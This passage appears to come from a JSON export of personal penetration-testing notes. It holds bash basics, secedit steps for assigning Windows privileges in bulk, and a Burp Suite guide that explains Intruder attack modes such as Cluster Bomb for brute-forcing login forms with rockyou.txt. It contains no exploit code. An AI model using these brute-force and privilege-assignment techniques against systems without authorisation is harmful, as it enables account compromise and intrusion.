style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # Hello world&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Arrays&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYARRAY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;element0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;element1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;element2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYARRAY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;3&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;element3&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYARRAY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;     # element0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYARRAY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;-1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;    # element3&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYARRAY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;     # element0 element1 element2 element3&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYARRAY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # element1 element2&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYARRAY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;    # 0 1 2 3&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Size of an array&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MYARRAY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # 4&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Remove an element from an array&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;unset&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; MYARRAY[3]&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Arrays are actually a special case of dictionaries,&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# which hold key/value pairs. In an array, keys are just&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# 0-indexed numbers. Dictionaries work exactly the same&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# as arrays, except rather than referencing/setting&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# elements by number, you reference and set them by key.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Create a dictionary&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;declare&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; MYDICT&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Math&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$((&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; 1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ))&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # 3&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$RANDOM&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;      # Random-ish number&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Loop over lines in a file&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; while&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; read&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -r&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LINE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; do&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;\t# Do stuff with $LINE&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;done&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Loop over filenames with spaces&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;while&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; IFS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; read&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -r&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; do&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;\t# Do stuff with $FILE&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;done&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &amp;#x3C;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;find&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; $DIR &lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;-type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; f &lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;-print0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# The advantage this has over other approaches is that it&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# doesn&#039;t create a subshell, so you can use variables set&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# within the loop elsewhere. We need to temporarily&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# override IFS because our list is null-separated; the&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# space between the -d and the &#039;&#039; (an empty string, which&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Bash interprets as the null character) is *required*.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Bulk-edit-Windows-permissions":{"slug":"spells/Bulk-edit-Windows-permissions","filePath":"spells/Bulk edit Windows permissions.md","title":"Bulk edit Windows permissions","links":[],"tags":["OS/Windows/Permissions","Application/secedit","HowTo"],"content":"Privileges can also be manipulated/assigned to users in bulk using the secedit tool\n\nDump system privileges: secedit /export /cfg config.inf.\nEdit config.inf, appending the user you want to have a given privilege to that privilege’s assignment line (comma-delineated list).\nRe-import the system privileges: secedit /import /cfg config.inf /db config.sdb &amp; secedit /configure /db config.sdb /cfg config.inf\n","richContent":"&lt;p&gt;Privileges can also be manipulated/assigned to users in bulk using the secedit tool&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;Dump system privileges: &lt;code&gt;secedit /export /cfg config.inf&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;Edit config.inf, appending the user you want to have a given privilege to that privilege’s assignment line (comma-delineated list).&lt;/li&gt;\n&lt;li&gt;Re-import the system privileges: &lt;code&gt;secedit /import /cfg config.inf /db config.sdb &amp;#x26; secedit /configure /db config.sdb /cfg config.inf&lt;/code&gt;&lt;/li&gt;\n&lt;/ol&gt;"},"spells/Burp-Suite":{"slug":"spells/Burp-Suite","filePath":"spells/Burp Suite.md","title":"Burp Suite","links":[],"tags":["Application/BurpSuite","AttackCycle/Reconnaissance/Fuzzing","AttackCycle/Exploitation/BruteForcing","OS/Linux/Distros/Kali"],"content":"Keyboard shortcuts\n\nCtrl + Shift + D — Switch to Dashboard\nCtrl + Shift + T — Switch to Target\nCtrl + Shift + P — Switch to Proxy\nCtrl + Shift + I — Switch to Intruder\nCtrl + Shift + R — Switch to Repeater\nCtrl + F — Forward intercepted request\nCtrl + U — URL encode selected text in Proxy → Intercept\nCtrl + R — Send request from Proxy to Repeater\nCtrl + R — Send request from Proxy to Intruder\n\nTarget\nScope\nSites can be added to the project scope under Target → Scope.\nYou can also add them by right-clicking on a site in Target → Site map. When you do this, you’ll be prompted to turn off logging outside of the scope. If you want to change this (or forget to set it), then you can still do so in Logger by clicking on the “Capture filter” bar and then checking the “Capture only in-scope items (Suite scope)”\nYou can further restrict the Proxy to only intercept in-scope requests under Proxy → Options → Intercept Client Requests by turning on “And URL Is in target scope”.\nIssue definitions\nTarget → Issue definitions provides a list of the issues used by the vulnerability scanner built into the paid version of Burp Suite. For the Community Edition (i.e., what comes with Kali Linux), it’s basically just a massive (and very useful!) reference.\nIntruder\nSniper\nSniper takes a single word list and inserts each element into each defined position, one element and one position at a time.\nFor example, assume a three-element word list containing one, two, and three, and the body date foo=position1&amp;bar=position2. Then if position1 and position2 are both defined as positions, Sniper will produce the following sequence of attempts:\n\nfoo=one&amp;bar=position2\nfoo=two&amp;bar=position2\nfoo=three&amp;bar=position2\nfoo=position1&amp;bar=one\nfoo=position1&amp;bar=two\nfoo=position1&amp;bar=three\n\nSniper is most useful when attacking a single position, however.\nBattering ram\nBattering Ram again takes a single word list, but then inserts the same payload into every position on each run.\nFor example, assume a three-element word list containing one, two, and three, and the body date foo=position1&amp;bar=position2. Then if position1 and position2 are both defined as positions, Battering Ram will produce the following sequence of attempts:\n\nfoo=one&amp;bar=one\nfoo=two&amp;bar=two\nfoo=three&amp;bar=three\n\nIt’s a little mysterious to me why this attack is useful.\nPitchfork\nPitchfork takes one word list per position, and then iterates through them in sequence (thus all word lists need to be the same length; if the lists are of different lengths, then Pitchfork will stop upon reaching the end of the shortest list).\nFor example, assume one three-element word list containing one, two, and three, a second three-element word list containing alpha, beta, and gamma, and the body date foo=position1&amp;bar=position2. Then if position1 and position2 are both defined as positions, Pitchfork will produce the following sequence of attempts:\n\nfoo=one&amp;bar=alpha\nfoo=two&amp;bar=beta\nfoo=three&amp;bar=gamma\n\nThis is generally the approach that would be used in order to test against a potential list of username/password tuples.\nCluster bomb\nCluster Bomb takes one word list per position, and then tests every possible combination in sequence.\nFor example, assume one three-element word list containing one, two, and three, a second three-element word list containing alpha, beta, and gamma, and the body date foo=position1&amp;bar=position2. Then if position1 and position2 are both defined as positions, Cluster Bomb will produce the following sequence of attempts:\n\nfoo=one&amp;bar=alpha\nfoo=one&amp;bar=beta\nfoo=one&amp;bar=gamma\nfoo=two&amp;bar=alpha\nfoo=two&amp;bar=beta\nfoo=two&amp;bar=gamma\nfoo=three&amp;bar=alpha\nfoo=three&amp;bar=beta\nfoo=three&amp;bar=gamma\n\nThis is a good approach for attacking login forms if you don’t already know the actual credentials, but want to fuzz using some set of likely values (like rockyou.txt).\nObviously this is the most expensive attack in terms of connections/time, and thus also the one most likely to get you noticed!\nDecoder\nThe Burp Suite Decoder displays hashes in the “Hex” view by default; to convert them into the (hex) ASCII string you’re used to, encode this output as “ASCII Hex”.\nMacros\nWhen dealing with forms that include session cookies or anti-CSRF tokens, we can either grab these tokens directly in Intruder using the Recursive Grep function (within the Intruder module), or construct a macro in Project options → Sessions → Macros (necessary if there’s, for example, a random redirect to make our life harder).\nBasically, macros just define repeated requests that we can make. Once a request is defined here, we can add an entry in Session Handling Rules and define the Scope of the macro (the tools it’s active in and the URL it applies to). Then in details we can trigger the macro. Generally you’ll want to restrict the URLs the macro applies to and what parameters/cookies get updated by the macro as much as possible.","richContent":"&lt;h2 id=&quot;keyboard-shortcuts&quot;&gt;Keyboard shortcuts&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#keyboard-shortcuts&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;Ctrl + Shift + D&lt;/code&gt; — Switch to Dashboard&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;Ctrl + Shift + T&lt;/code&gt; — Switch to Target&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;Ctrl + Shift + P&lt;/code&gt; — Switch to Proxy&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;Ctrl + Shift + I&lt;/code&gt; — Switch to Intruder&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;Ctrl + Shift + R&lt;/code&gt; — Switch to Repeater&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;Ctrl + F&lt;/code&gt; — Forward intercepted request&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;Ctrl + U&lt;/code&gt; — URL encode selected text in &lt;strong&gt;Proxy → Intercept&lt;/strong&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;Ctrl + R&lt;/code&gt; — Send request from Proxy to Repeater&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;Ctrl + R&lt;/code&gt; — Send request from Proxy to Intruder&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;target&quot;&gt;Target&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#target&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=&quot;scope&quot;&gt;Scope&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#scope&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Sites can be added to the project scope under &lt;strong&gt;Target → Scope&lt;/strong&gt;.&lt;/p&gt;\n&lt;p&gt;You can also add them by right-clicking on a site in &lt;strong&gt;Target → Site map&lt;/strong&gt;. When you do this, you’ll be prompted to turn off logging outside of the scope. If you want to change this (or forget to set it), then you can still do so in Logger by clicking on the “Capture filter” bar and then checking the “Capture only in-scope items (Suite scope)”&lt;/p&gt;\n&lt;p&gt;You can further restrict the Proxy to only intercept in-scope requests under &lt;strong&gt;Proxy → Options → Intercept Client Requests&lt;/strong&gt; by turning on “And URL Is in target scope”.&lt;/p&gt;\n&lt;h3 id=&quot;issue-definitions&quot;&gt;Issue definitions&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#issue-definitions&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;strong&gt;Target → Issue definitions&lt;/strong&gt; provides a list of the issues used by the vulnerability scanner built into the paid version of Burp Suite. For the Community Edition (i.e., what comes with Kali Linux), it’s basically just a massive (and very useful!) 